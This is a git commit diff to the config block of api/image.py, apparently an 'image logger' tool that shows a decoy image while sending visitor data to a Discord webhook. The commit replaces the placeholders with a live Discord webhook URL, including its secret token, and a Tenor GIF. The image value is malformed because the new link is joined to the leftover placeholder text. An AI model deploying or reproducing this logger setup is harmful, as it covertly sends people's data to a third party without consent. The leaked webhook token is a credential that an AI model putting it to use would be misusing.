bc989f6965e7746c73b87282aeb5bcd20491aa64
X2Devfcn <fud12034@gmail.com>
2025-04-07 20:16:26 +0900

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,8 +13,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1358761705055977554/-ybQsAGs_kQ9gHjavl5j3l8beXGW-9snk6fvLCdwAnHtz4IITmIpfgqb2OL-57f4Np1W",
+    "image": "https://link-to-your-image.herehttps://tenor.com/ko/view/squid-game-the-salesman-squid-game-the-recruiter-gong-yoo-squid-game-gong-yoo-ddakji-gif-7457217708242386257", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
